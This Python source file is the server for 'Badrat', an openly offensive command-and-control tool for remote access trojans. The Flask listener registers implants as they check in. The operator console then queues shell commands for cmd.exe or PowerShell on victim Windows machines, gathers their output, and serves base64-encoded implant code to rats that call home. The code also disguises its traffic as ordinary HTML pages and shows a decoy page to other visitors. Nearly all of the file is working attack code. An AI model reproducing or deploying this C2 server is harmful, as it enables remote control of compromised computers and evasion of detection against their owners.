#!/usr/bin/env python3
from flask import Flask, request
from datetime import datetime
import threading
import argparse
import readline
import logging
import base64
import time
import json
import sys
import os

# CSCI 201 teacher: Noooo you can't just use global variables to make things easier
# haha, global variables go brrr
RED = '\033[91m'
ENDC = '\033[0m'
UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
parser.add_argument("-s", "--ssl", help="Enable HTTPS listener instead of default HTTP", default=False, action="store_true", dest="ssl")
args = parser.parse_args()
port = args.port
ssl = args.ssl

supported_types = ["c", "py", "js", "ps1", "hta"]

# I should probably make a dict of dicts...
commands = {}
rats = {}
types = {}
usernames = {}

# Required function for interactive history
def history(numlines=-1):
    total = readline.get_current_history_length()
    if(numlines == -1):
        numlines = total
    if(numlines > 0):
        for i in range(total - numlines, total):
            print(readline.get_history_item(i + 1))

# Wrap C2 comms in html and html2 code to make requests look more legitimate
def htmlify(data):
    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    html2 = "</b>\n"
    html2 += "</body>\n"
    html2 += "</html>\n"
    return(html + data + "\n" + html2)

# Print colors according to the rat type
def colors(value):
    BOLD = '\033[1m'
    c = '\033[91m'    # Red
    py = '\033[92m'   # Green
    js = '\033[93m'   # Yellow
    ps1 = '\033[94m'  # Blue
    hta = '\033[95m'  # Purple
    colors = {"c":c, "py":py, "js":js, "ps1":ps1, "hta":hta}
    if(value in colors.keys()):
        return(colors[value] + value + ENDC)
    elif(value in types.keys()):
        return(colors[types[value]] + value + ENDC)
    elif(value == "all"):
        return(BOLD + "ALL RATS" + ENDC)
    elif(value == ">>"):
        return( BOLD + c + ">" + js + ">" + ENDC)
    elif(value == "commit Seppuku"):
        return(c + value + ENDC)
    elif(value == "HTTP" or value == "HTTPS"):
        return(BOLD + value + ENDC)
    try:
        checkin = datetime.strptime(value, "%H:%M:%S")
        delta_seconds = (datetime.now() - checkin).seconds
        if(delta_seconds > 21):
            return(BOLD + c + value + ENDC)
        elif(delta_seconds > 7):
            return(BOLD + js + value + ENDC)
        else:
            return(BOLD + py + value + ENDC)
    except:
        return(UNDERLINE + value + ENDC)

# Page sent to "unauthorized" users of the http listener
def default_page():
    message = "WTF who are you go away"
    return(htmlify(message))

# Allow rats to call home and request more ratcode of their own type
def send_ratcode(ratID):
    print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
    with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
        ratcode = fd.read()
        if(types[ratID] == "hta"):
            return(ratcode)
        else:
            ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
            print("Returing ratcode: "+ratcode)
            return(ratcode)

def serve_server(port=8080):
    app = Flask(__name__)

    # Disable annoying console output for GET/POST requests
    log = logging.getLogger('werkzeug')
    log.disabled = True

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['GET'])
    def badrat_get(path):
        user_agent = request.headers['User-Agent']
        # Path must be /<ratID>/r/b.hta AND user agent belongs to mshta.exe
        if("/r/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent and path.split("/")[0] in rats.keys()):
            ratID = path.split("/")[0]
            return(send_ratcode(ratID))
        else:
            print("[!] GET request from non-rat client requested path /" + path)
            return(default_page())

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['POST'])
    def badrat_comms(path):
        # Parse POST parameters
        post_json = request.get_json(force=True)
        post_dict = dict(post_json)
        try:
            ratID = str(post_dict['id'])
            ratType = str(post_dict['type'])
            if(ratType not in supported_types):
                ratType = "?"
            username = str(post_dict['un'])
        except:
            print("\n[!] Failed to grab id, type, or user param from POST request")
            return(default_page())

        # Update checkin time for an agent every checkin
        checkin = datetime.now().strftime("%H:%M:%S")
        rats[ratID] = checkin
        types[ratID] = ratType
        usernames[ratID] = username

        # If there is no current command for a rat, create a blank one
        if(ratID not in commands):
            commands[ratID] = ""
            print("\n[*] New rat checked in: " + colors(ratID))

        if("retval" in post_dict.keys()):
            commands[ratID] = ""
            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
            print(base64.b64decode(post_dict['retval']).decode('utf-8'))

        return(htmlify(json.dumps({"cmnd": commands[ratID]})))

    # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
    if(ssl):
        print("[*] Starting " + colors("HTTPS") + " listener on port " + str(port) + "\n\n")
        app.run(host="0.0.0.0", port=port, ssl_context=("cert/cert.pem", "cert/privkey.pem"))
    else:
        print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
        app.run(host="0.0.0.0", port=port)

def get_rats(current=""):
    print("\n    implant id \ttype\tcheck-in\tusername")
    print("    ----------\t----\t--------\t--------")
    for ratID, checkin in rats.items():
        if(current == ratID or current == "all"):
            print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
        else:
            print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
    print("")

def remove_rat(ratID):
    if(ratID == "all"):
        print("[*] Removing ALL rats")
        rats.clear()
        types.clear()
    else:
        try:
            del rats[ratID]
            del types[ratID]
            print("[*] Removing rat " + ratID)
        except:
            print("[!] Can't delete rat " + ratID + " for some reason")

def get_help():
    print("\nBadrats is a collection of rats designed for initial access. Rats are designed to be small and have few features.")
    print("For better post exploit functionality, execution should be passed off to other C2 frameworks")
    print("-------------------------------------------------------------------------")
    print("")
    print("Server commands: -- commands to control the badrat server")
    print("help -- it's this help page, duh")
    print("rats/agents/sessions -- gets the list of rats and their last checkin time")
    print("exit -- exits the badrat console and shuts down the listener")
    print("<ratID> -- start interacting with the specified rat")
    print("all -- start interacting with ALL rats")
    print("back -- backgrounds the current rat and goes to the main menu")
    print("remove all -- unregisters ALL rats")
    print("remove <ratID> -- unregisters the specified <ratID>")
    print("clear -- clear the screen")
    print("")
    print("Rat commands: -- commands to interact with a badrat rat")
    print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
    print("spawn -- used to spawn a new rat in a new process.")
    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
    print("-------------------------------------------------------------------------")
    print("")
    print("Extra things to know:")
    print("The rats are written in Windows JScript and Powershell, run in a wscript.exe, mshta.exe, or powershell.exe process")
    print("The server is written in python and uses an HTTP listener for C2 comms")
    print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
    print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
    print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
    print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe\n")

if __name__ == "__main__":
    # Start the Flask server
    server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
    server.start()
    time.sleep(0.5)
    if not server.is_alive():
        print("\n[!] Could not start listener!")
        sys.exit()

    # Main menu
    while True:
        inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")

        # Check if the operator wants to quit badrat
        if(inp == "exit"):
            print("[*] Shutting down badrat listener")
            sys.exit()

        # Gets the help info
        elif(inp == "help"):
            get_help()

        # View rats, their types, and their latest checkin times
        elif(inp == "agents" or inp == "rats" or inp == "sessions"):
            get_rats()

        # Remove rats -- either by ratID or all
        elif(str.startswith(inp, "remove")):
            if(str.startswith(inp, "all", 6, 3)):
                remove_rat("all")
            else:
                remove_rat(inp.split(" ")[1])

        # Clear the screen
        elif(inp == "clear"):
            os.system("clear")

        # Enter rat specific command prompt
        elif(inp in rats.keys() or inp == "all"):
            ratID = inp
            while True:
                inp = input(colors(ratID) + " \\\\> ")
                if(inp == "back" or inp == "exit"):
                    break
                elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
                    get_rats(ratID)
                elif(inp == "clear"):
                    os.system("clear")
                elif(inp):
                    if(inp == "quit" or inp == "kill_rat"):
                        print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
                        inp = "quit"
                    elif(inp == "spawn"):
                        if(types[ratID] == "hta"):
                            inp = "spawn"
                        else:
                            inp = "spawn " + send_ratcode(ratID)
                    else:
                        print("[*] Queued command " + colors(inp) + " for " + colors(ratID))

                    if(ratID == "all"):
                        # update ALL commands
                        for i in commands.keys():
                            commands[i] = inp
                    else:
                        commands[ratID] = inp
